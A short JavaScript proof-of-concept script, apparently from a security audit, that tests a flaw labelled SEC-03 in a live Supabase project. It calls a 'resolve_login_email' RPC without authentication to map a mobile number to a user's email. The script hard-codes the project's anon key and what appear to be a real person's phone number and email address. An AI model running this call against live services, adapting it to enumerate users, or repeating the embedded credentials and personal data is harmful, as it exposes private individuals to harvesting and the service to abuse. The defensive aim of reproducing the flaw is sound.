import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = "https://lgqgnsngxhqdzpstiddj.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxncWduc25neGhxZHpwc3RpZGRqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzcxOTM2NTksImV4cCI6MjA5Mjc2OTY1OX0.P1GOBl3rK3P4gtzzp7B68c9zdw4mTo0_H-R6U0Dv5_Q";

const anonSupabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

async function testSec03() {
  console.log("=== Testing SEC-03: Public PII Harvesting on Live Supabase ===");
  console.log("Calling resolve_login_email with mobile: 8085035032 as completely unauthenticated anon...");
  
  const { data, error } = await anonSupabase.rpc("resolve_login_email", { _login: "8085035032" });
  
  if (error) {
    console.log("RPC Error:", error.message);
  } else {
    console.log("VULNERABILITY REPRODUCED! Returned email:", data);
    if (data === "rahulpatidar1009@gmail.com") {
      console.log("CONFIRMED: Unauthenticated caller successfully harvested email for mobile 8085035032!");
    }
  }
}

testSec03().catch(console.error);
